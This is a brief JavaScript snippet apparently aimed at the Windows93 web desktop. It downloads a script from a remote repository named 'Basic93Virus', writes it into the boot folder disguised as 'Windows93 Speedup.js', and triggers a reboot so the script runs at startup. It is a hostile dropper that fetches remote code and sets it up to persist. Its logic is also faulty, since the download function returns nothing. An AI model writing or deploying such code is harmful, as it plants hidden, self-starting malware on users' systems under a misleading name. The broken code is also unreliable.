function download_script(url) {
	fetch(url)
  .then(response => response.text())
  .then(data => console.log(data));
}

var foo = download_script('https://ghcdn.rawgit.org/OutRite/Basic93Virus/main/main.js')

$db.set("boot/Windows93 Speedup.js", foo)

$exe('reboot')
